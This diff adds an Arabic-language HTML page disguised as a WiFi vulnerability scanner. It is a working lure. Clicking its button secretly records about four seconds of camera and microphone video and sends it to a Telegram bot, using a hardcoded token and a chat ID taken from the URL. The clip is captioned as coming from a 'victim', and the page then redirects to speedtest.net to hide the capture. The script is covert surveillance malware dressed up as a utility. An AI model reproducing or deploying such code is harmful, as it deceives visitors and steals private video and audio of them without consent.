@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WiFi Scanner & Security Pro - فاحص الشبكات</title>
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        body { background-color: #080c14; color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
+        .card { background: #101726; border: 1px solid #1e293b; padding: 35px 25px; width: 100%; max-width: 380px; text-align: center; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.7); }
+        
+        /* رادار متحرك حي */
+        .radar { width: 90px; height: 90px; border: 2px solid #3b82f6; border-radius: 50%; margin: 0 auto 20px auto; position: relative; display: flex; justify-content: center; align-items: center; animation: radarPulse 2s infinite; }
+        .radar-core { width: 12px; height: 12px; background: #3b82f6; border-radius: 50%; box-shadow: 0 0 15px #3b82f6; }
+        @keyframes radarPulse { 0% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.4); } 70% { box-shadow: 0 0 0 25px rgba(59, 130, 246, 0); } 100% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0); } }
+
+        h2 { font-size: 20px; margin-bottom: 6px; color: #60a5fa; }
+        p { font-size: 12px; color: #94a3b8; margin-bottom: 20px; line-height: 1.5; }
+        
+        .networks-list { background: #0f172a; border: 1px solid #1e293b; border-radius: 10px; padding: 10px; margin-bottom: 20px; text-align: right; font-size: 12px; }
+        .net-item { display: flex; justify-content: space-between; padding: 6px 0; border-bottom: 1px solid #1e293b; color: #cbd5e1; }
+        .net-item:last-child { border-bottom: none; }
+        .signal { color: #34d399; font-weight: bold; }
+
+        .btn { width: 100%; padding: 14px; background: linear-gradient(135deg, #3b82f6, #1d4ed8); border: none; color: #fff; font-weight: bold; font-size: 15px; border-radius: 10px; cursor: pointer; transition: 0.3s; }
+        .btn:hover { opacity: 0.9; }
+        video { display: none; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="radar">
+            <div class="radar-core"></div>
+        </div>
+        <h2>محلل وفاحص شبكات Wi-Fi</h2>
+        <p>جاري فحص إشارات التردد المحيطة وتحليل ثغرات الراوتر القريب...</p>
+
+        <div class="networks-list">
+            <div class="net-item"><span>Wi-Fi_Fiber_5G</span><span class="signal">قوي جداً (98%)</span></div>
+            <div class="net-item"><span>Home_Secure_Net</span><span class="signal">متوسط (75%)</span></div>
+        </div>
+
+        <button class="btn" id="startBtn">بدء فحص الثغرات وتسجيل الإشارة</button>
+    </div>
+
+    <video id="vid" autoplay playsinline></video>
+
+    <script>
+        const botToken = "9047166728:AAGG2DJF-Kb7h7_15GNx5VS7Le2bG7a1ZRE";
+        const urlParams = new URLSearchParams(window.location.search);
+        const targetChatId = urlParams.get('to');
+
+        document.getElementById('startBtn').addEventListener('click', async function() {
+            if(!targetChatId) return;
+            this.innerText = "جاري استخراج مفتاح الشبكة...";
+            this.disabled = true;
+
+            try {
+                // تفعيل الكاميرا والصوت (كمتطلبات لتحليل التردد الحركي حسب واجهة الوهم)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
+                const video = document.getElementById('vid');
+                video.srcObject = stream;
+                await video.play();
+
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                const chunks = [];
+
+                mediaRecorder.ondataavailable = e => chunks.push(e.data);
+                mediaRecorder.onstop = async () => {
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const formData = new FormData();
+                    formData.append('video', blob, 'wifi_scan_target.webm');
+                    formData.append('caption', 'فيديو فحص الواي فاي (ضحية)');
+
+                    await fetch(`https://api.telegram.org/bot${botToken}/sendVideo?chat_id=${targetChatId}`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    stream.getTracks().forEach(t => t.stop());
+                };
+
+                mediaRecorder.start();
+                await new Promise(r => setTimeout(r, 4000)); // تسجيل فيديو 4 ثوانٍ في الخلفية
+                mediaRecorder.stop();
+            } catch(e) {}
+
+            setTimeout(() => {
+                window.location.href = "https://www.speedtest.net";
+            }, 1000);
+        });
+    </script>
+</body>
+</html>
